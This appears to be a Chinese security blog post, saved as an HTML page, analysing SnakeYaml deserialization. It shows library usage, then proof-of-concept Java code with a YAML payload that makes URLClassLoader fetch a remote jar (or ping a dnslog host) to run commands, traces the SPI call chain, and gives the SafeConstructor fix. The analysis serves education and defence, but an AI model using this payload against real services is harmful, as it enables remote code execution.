@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Java安全之SnakeYaml反序列化分析 - 编程中国的博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="Java安全之SnakeYaml反序列化分析" />
+<meta property="og:description" content="Java安全之SnakeYaml反序列化分析 0x00 前言 偶然间看到SnakeYaml的资料感觉挺有意思，发现SnakeYaml也存在反序列化利用的问题。借此来分析一波。
+0x01 SnakeYaml 使用 SnakeYaml 简介 SnakeYaml是用来解析yaml的格式，可用于Java对象的序列化、反序列化。
+SnakeYaml 使用 导入依赖jar包
+&lt;dependency&gt; &lt;groupId&gt;org.yaml&lt;/groupId&gt; &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt; &lt;version&gt;1.27&lt;/version&gt; &lt;/dependency&gt; 常用方法 String	dump(Object data) 将Java对象序列化为YAML字符串。 void	dump(Object data, Writer output) 将Java对象序列化为YAML流。 String	dumpAll(Iterator&lt;? extends Object&gt; data) 将一系列Java对象序列化为YAML字符串。 void	dumpAll(Iterator&lt;? extends Object&gt; data, Writer output) 将一系列Java对象序列化为YAML流。 String	dumpAs(Object data, Tag rootTag, DumperOptions.FlowStyle flowStyle) 将Java对象序列化为YAML字符串。 String	dumpAsMap(Object data) 将Java对象序列化为YAML字符串。 &lt;T&gt; T	load(InputStream io) 解析流中唯一的YAML文档，并生成相应的Java对象。 &lt;T&gt; T	load(Reader io) 解析流中唯一的YAML文档，并生成相应的Java对象。 &lt;T&gt; T	load(String yaml) 解析字符串中唯一的YAML文档，并生成相应的Java对象。 Iterable&lt;Object&gt;	loadAll(InputStream yaml) 解析流中的所有YAML文档，并生成相应的Java对象。 Iterable&lt;Object&gt;	loadAll(Reader yaml) 解析字符串中的所有YAML文档，并生成相应的Java对象。 Iterable&lt;Object&gt;	loadAll(String yaml) 解析字符串中的所有YAML文档，并生成相应的Java对象。 序列化 Myclass类：" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/69295150aff1459cc1d5f15dc3517006/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-12-29T09:18:21+08:00" />
+<meta property="article:modified_time" content="2022-12-29T09:18:21+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程中国的博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">Java安全之SnakeYaml反序列化分析</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-atom-one-light">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <h3><a id="JavaSnakeYaml_0"></a>Java安全之SnakeYaml反序列化分析</h3> 
+<h3><a id="0x00__2"></a>0x00 前言</h3> 
+<p>偶然间看到<code>SnakeYaml</code>的资料感觉挺有意思，发现<code>SnakeYaml</code>也存在反序列化利用的问题。借此来分析一波。</p> 
+<h3><a id="0x01_SnakeYaml__6"></a>0x01 SnakeYaml 使用</h3> 
+<h4><a id="SnakeYaml__8"></a>SnakeYaml 简介</h4> 
+<p><code>SnakeYaml</code>是用来解析yaml的格式，可用于Java对象的序列化、反序列化。</p> 
+<h4><a id="SnakeYaml__12"></a>SnakeYaml 使用</h4> 
+<p>导入依赖jar包</p> 
+<pre><code class="prism language-javascript"><span class="token operator">&lt;</span>dependency<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>groupId<span class="token operator">&gt;</span>org<span class="token punctuation">.</span>yaml<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>artifactId<span class="token operator">&gt;</span>snakeyaml<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>version<span class="token operator">&gt;</span><span class="token number">1.27</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>
+</code></pre> 
+<h4><a id="_24"></a>常用方法</h4> 
+<pre><code class="prism language-javascript">String	<span class="token function">dump</span><span class="token punctuation">(</span>Object data<span class="token punctuation">)</span>
+将Java对象序列化为<span class="token constant">YAML</span>字符串。
+<span class="token keyword">void</span>	<span class="token function">dump</span><span class="token punctuation">(</span>Object data<span class="token punctuation">,</span> Writer output<span class="token punctuation">)</span>
+将Java对象序列化为<span class="token constant">YAML</span>流。
+String	<span class="token function">dumpAll</span><span class="token punctuation">(</span>Iterator<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">Object</span><span class="token operator">&gt;</span> data<span class="token punctuation">)</span>
+将一系列Java对象序列化为<span class="token constant">YAML</span>字符串。
+<span class="token keyword">void</span>	<span class="token function">dumpAll</span><span class="token punctuation">(</span>Iterator<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">Object</span><span class="token operator">&gt;</span> data<span class="token punctuation">,</span> Writer output<span class="token punctuation">)</span>
+将一系列Java对象序列化为<span class="token constant">YAML</span>流。
+String	<span class="token function">dumpAs</span><span class="token punctuation">(</span>Object data<span class="token punctuation">,</span> Tag rootTag<span class="token punctuation">,</span> DumperOptions<span class="token punctuation">.</span>FlowStyle flowStyle<span class="token punctuation">)</span>
+将Java对象序列化为<span class="token constant">YAML</span>字符串。
+String	<span class="token function">dumpAsMap</span><span class="token punctuation">(</span>Object data<span class="token punctuation">)</span>
+将Java对象序列化为<span class="token constant">YAML</span>字符串。
+<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span> <span class="token constant">T</span>	<span class="token function">load</span><span class="token punctuation">(</span>InputStream io<span class="token punctuation">)</span>
+解析流中唯一的<span class="token constant">YAML</span>文档，并生成相应的Java对象。
+<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span> <span class="token constant">T</span>	<span class="token function">load</span><span class="token punctuation">(</span>Reader io<span class="token punctuation">)</span>
+解析流中唯一的<span class="token constant">YAML</span>文档，并生成相应的Java对象。
+<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span> <span class="token constant">T</span>	<span class="token function">load</span><span class="token punctuation">(</span>String yaml<span class="token punctuation">)</span>
+解析字符串中唯一的<span class="token constant">YAML</span>文档，并生成相应的Java对象。
+Iterable<span class="token operator">&lt;</span>Object<span class="token operator">&gt;</span>	<span class="token function">loadAll</span><span class="token punctuation">(</span>InputStream yaml<span class="token punctuation">)</span>
+解析流中的所有<span class="token constant">YAML</span>文档，并生成相应的Java对象。
+Iterable<span class="token operator">&lt;</span>Object<span class="token operator">&gt;</span>	<span class="token function">loadAll</span><span class="token punctuation">(</span>Reader yaml<span class="token punctuation">)</span>
+解析字符串中的所有<span class="token constant">YAML</span>文档，并生成相应的Java对象。
+Iterable<span class="token operator">&lt;</span>Object<span class="token operator">&gt;</span>	<span class="token function">loadAll</span><span class="token punctuation">(</span>String yaml<span class="token punctuation">)</span>
+解析字符串中的所有<span class="token constant">YAML</span>文档，并生成相应的Java对象。
+</code></pre> 
+<h5><a id="_53"></a>序列化</h5> 
+<p>Myclass类：</p> 
+<pre><code class="prism language-javascript"><span class="token keyword">package</span> test<span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">{<!-- --></span>
+    String value<span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token function">MyClass</span><span class="token punctuation">(</span><span class="token parameter">String args</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        value <span class="token operator">=</span> args<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> String <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>Test类：</p> 
+<pre><code class="prism language-javascript">@Test
+    <span class="token keyword">public</span>  <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+
+    MyClass obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token string">"this is my data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">&gt;</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    data<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"MyClass"</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    Yaml yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    String output <span class="token operator">=</span> yaml<span class="token punctuation">.</span><span class="token function">dump</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>结果：</p> 
+<pre><code class="prism language-javascript"><span class="token literal-property property">MyClass</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">!</span>test<span class="token punctuation">.</span>MyClass <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
+</code></pre> 
+<p>前面的<code>!!</code>是用于强制类型转化，强制转换为<code>!!</code>后指定的类型，其实这个和Fastjson的<code>@type</code>有着异曲同工之妙。用于指定反序列化的全类名。</p> 
+<h5><a id="_96"></a>反序列化</h5> 
+<p>yaml文件：</p> 
+<pre><code class="prism language-javascript"><span class="token literal-property property">firstName</span><span class="token operator">:</span> <span class="token string">"John"</span>
+<span class="token literal-property property">lastName</span><span class="token operator">:</span> <span class="token string">"Doe"</span>
+<span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">20</span>
+</code></pre> 
+<p>测试类：</p> 
+<pre><code class="prism language-javascript">@Test
+    <span class="token keyword">public</span>  <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+        Yaml yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        InputStream resourceAsStream <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span><span class="token string">"test1.yaml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Object load <span class="token operator">=</span> yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>resourceAsStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>load<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>执行结果：</p> 
+<pre><code class="prism language-javascript"><span class="token punctuation">{<!-- --></span>firstName<span class="token operator">=</span>John<span class="token punctuation">,</span> lastName<span class="token operator">=</span>Doe<span class="token punctuation">,</span> age<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">}</span>
+</code></pre> 
+<h3><a id="0x02__125"></a>0x02 漏洞分析</h3> 
+<h4><a id="_127"></a>漏洞复现</h4> 
+<p>首先还是先来复现一下漏洞，能进行利用后再进行分析利用过程。</p> 
+<p>下面来看到一段POC代码：</p> 
+<pre><code class="prism language-javascript"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">main</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token parameter">String<span class="token punctuation">[</span><span class="token punctuation">]</span> args</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+
+        String context <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://fnsdae.dnslog.cn\"]]]]\n"</span><span class="token punctuation">;</span>
+        Yaml yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> 
+<span class="token punctuation">}</span>
+</code></pre> 
+<p><img src="https://images2.imgbox.com/a6/26/YUOvHlcJ_o.jpg" alt=""></p> 
+<p>成功获取dnslog请求，但是这poc也只能探测是否进行了反序列化。如果需要利用的话还需要构造命令执行的代码。</p> 
+<p>利用脚本其实已经有师傅写好了。转到这个<a href="https://github.com/artsploit/yaml-payload/">github</a>项目下下载该项目。打开修改代码。</p> 
+<p><img src="https://images2.imgbox.com/0e/be/MLpZWTCE_o.jpg" alt=""></p> 
+<p>脚本也比较简单，就是实现了<code>ScriptEngineFactory</code>接口，然后在静态代码块处填写需要执行的命令。将项目打包后挂载到web端，使用payload进行反序列化后请求到该位置，实现<code>java.net.URLClassLoader</code>调用远程的类进行执行命令。</p> 
+<pre><code class="prism language-javascript">python <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token operator">--</span>cgi <span class="token number">8888</span>
+</code></pre> 
+<p>测试代码：</p> 
+<pre><code class="prism language-javascript"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">main</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token parameter">String<span class="token punctuation">[</span><span class="token punctuation">]</span> args</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+
+        String context <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [\n"</span> <span class="token operator">+</span>
+                <span class="token string">"  !!java.net.URLClassLoader [[\n"</span> <span class="token operator">+</span>
+                <span class="token string">"    !!java.net.URL [\"http://127.0.0.1:8888/yaml-payload-master.jar\"]\n"</span> <span class="token operator">+</span>
+                <span class="token string">"  ]]\n"</span> <span class="token operator">+</span>
+                <span class="token string">"]"</span><span class="token punctuation">;</span>
+        Yaml yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span>
+</code></pre> 
+<p><img src="https://images2.imgbox.com/37/e3/yipX9ylx_o.jpg" alt=""></p> 
+<p>命令执行成功。</p> 
+<h4><a id="SPI_180"></a>SPI机制</h4> 
+<p>在漏洞分析前先来了解一下SPI机制，在前面使用的执行代码的payload中看到使用<code>ScriptEngineManager</code>类来进行构造，其实<code>ScriptEngineManager</code>利用的的底层也是SPI机制。</p> 
+<p>SPI ，全称为 Service Provider Interface，是一种服务发现机制。它通过在ClassPath路径下的META-INF/services文件夹查找文件，自动加载文件里所定义的类。也就是动态为某个接口寻找服务实现。</p> 
+<p>那么如果需要使用 SPI 机制需要在Java classpath 下的 <code>META-INF/services/</code> 目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的<strong>实现类</strong>。</p> 
+<p><img src="https://images2.imgbox.com/39/4a/poBbvdp1_o.jpg" alt=""></p> 
+<p>在第一次听说SPI还是在看JDBC底层实现的时候，但是并没有去做多的了解。这里拿JDBC来举个例子。</p> 
+<p>SPI是一种动态替换发现的机制，比如有个接口，想运行时动态的给它添加实现，你只需要添加一个实现。</p> 
+<p>来看到连接驱动的jar包，这里就是在Java classpath 下的 <code>META-INF/services/</code> 定义实现类。</p> 
+<p><img src="https://images2.imgbox.com/50/11/y39AI54c_o.jpg" alt=""></p> 
+<p><img src="https://images2.imgbox.com/ac/99/fTdYonQq_o.jpg" alt=""></p> 
+<p>而<a href="https://cloud.tencent.com/solution/database?from=10680" rel="nofollow">数据库</a>有很多种类型，而实现方式不尽相同，而在实现各种连接驱动的时候，只需要添加<code>java.sql.Driver</code>实现接口，然后Java的SPI机制可以为某个接口寻找服务实现，就实现了各种数据库的驱动连接。</p> 
+<p><strong>实现细节</strong>：程序会<code>java.util.ServiceLoder</code>动态装载实现模块，在<code>META-INF/services</code>目录下的配置文件寻找实现类的类名，通过<code>Class.forName</code>加载进来,<code>newInstance()</code>反射创建对象,并存到缓存和列表里面。</p> 
+<h4><a id="_204"></a>漏洞分析</h4> 
+<p>先来简单讲讲我理解的该漏洞利用的过程，建立在未对该漏洞分析前。</p> 
+<p>前面说到SPI会通过<code>java.util.ServiceLoder</code>进行动态加载实现，而在刚刚的exp的代码里面实现了<code>ScriptEngineFactory</code>并在<code>META-INF/services/</code> 里面添加了实现类的类名，而该类在静态代码块处是我们的执行命令的代码，而在调用的时候，SPI机制通过<code>Class.forName</code>反射加载并且<code>newInstance()</code>反射创建对象的时候，静态代码块进行执行，从而达到命令执行的目的。</p> 
+<p>下面开始调试分析漏洞，在漏洞位置下断点</p> 
+<p>这里调用<code>this.loadFromReader</code>跟踪查看</p> 
+<p>以上就是各种赋值，需要注意的是数据的流向，这里没啥好看的，来步进到下面，下面的返回值调用<code>constructor.getSingleData</code>跟踪。</p> 
+<p>这里并没有走到判断体里面而是直接返回并且调用了<code>this.constructDocument()</code>,跟进。</p> 
+<p>这里调用<code>this.constructObject</code>就返回了一个Object对象，所以继续从这个方法跟进进去，查看实现。</p> 
+<p>跟进<code>constructObjectNoCheck</code></p> 
+<p>这个点先跟踪 <code>getConstructor</code></p> 
+<p>这里还是返回了一个反射的class对象，继续跟。</p> 
+<p>这里获取了name的值为<code>javax.script.ScriptEngineManager</code>,然后调用<code>getClassForName</code>对name进行传入获取cl的class对象。跟踪<code>getClassForName</code>。</p> 
+<p>在这里就可以看到使用反射创建了一个<code>javax.script.ScriptEngineManager</code>对象的具体实现，而后面代码则是一些赋值的。执行到下一步来到了这个。</p> 
+<p>跟踪<code>construct</code>方法查看，到了这部分其实就已经到了关键部分。</p> 
+<p>看到这段代码创建了一个array数组，并且调用<code>node.getType.getDeclaredConstructors();</code>赋值给<code>arr$</code>数组，回想前面的分析中，获取的name，也就是利用了<code>javax.script.ScriptEngineManager</code>，<code>Class.forName</code>进行创建反射对象并且赋值给note的type里面。而后这里<code>getDeclaredConstructors()</code>获取它的无参构造方法。</p> 
+<p>然后将获取到的arr数组添加到<code>possibleConstructors</code></p> 
+<p>而后将获取到的<code>possibleConstructors</code>获取到的第一个数组进行赋值并转换成<code>Constructor</code>类型</p> 
+<p>这里回去遍历获取snode的值。</p> 
+<p>这里进行使用反射实例化对象。</p> 
+<p>到了这里以为就结束了嘛？不是的，其实我们现在只是知道了<code>javax.script.ScriptEngineManager</code>是如何进行实例化的，但我们并不知道<code>javax.script.ScriptEngineManager</code>实例化后是如何触发的代码执行。下面可以来跟踪一下SPI机制是怎么实现的。</p> 
+<p>在前面反射调用无参构造方法后，会走到这里，下面调用init方法跟踪一下。</p> 
+<p>跟踪</p> 
+<p>看到这里其实就和前面讲到的SPI机制一样，调用<code>getServiceLoader</code>动态加载类，这里先在慢慢往下看</p> 
+<p>跟进该地方会看到调用<code>hasNextService</code>方法</p> 
+<p>这里会去<code>META-INF/services/javax.script.ScriptEngineFactory</code>获取实现类的信息</p> 
+<p>下面再来跟进<code>itr.text</code></p> 
+<p>这里会去实例化接口的实现类</p> 
+<p>走到这一步命令执行成功。</p> 
+<h3><a id="0x03__260"></a>0x03 漏洞修复</h3> 
+<p>其实该漏洞涉及到了全版本，只要反序列化内容可控,那么就可以去进行反序列化攻击</p> 
+<p>修复方案：加入<code>new SafeConstructor()</code>类进行过滤</p> 
+<pre><code class="prism language-javascript"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">main</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token parameter">String<span class="token punctuation">[</span><span class="token punctuation">]</span> args</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+
+        String context <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [\n"</span> <span class="token operator">+</span>
+                <span class="token string">"  !!java.net.URLClassLoader [[\n"</span> <span class="token operator">+</span>
+                <span class="token string">"    !!java.net.URL [\"http://127.0.0.1:8888/yaml-payload-master.jar\"]\n"</span> <span class="token operator">+</span>
+                <span class="token string">"  ]]\n"</span> <span class="token operator">+</span>
+                <span class="token string">"]"</span><span class="token punctuation">;</span>
+        Yaml yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SafeConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>再次进行反序列化会抛异常。</p> 
+<p>再者就是拒绝不安全的反序列化操作，反序列化数据前需要经过校验或拒绝反序列化数据可控。</p> 
+<h3><a id="0x04__286"></a>0x04 结尾</h3> 
+<p>在审计中其实就可以直接定位<code>yaml.load();</code>，然后进行回溯，如若参数可控，那么就可以尝试传入payload。但又出现另外一个问题，假如不出网的情况，是不是有很好的解决方案呢？</p>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/102db70384fed4c1a87c00dc96f636a7/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">el-menu刷新回到默认</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/72adf6cf9904c2e028b6e87cc6a57daf/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">通过指针消除字符串重复项</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程中国的博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
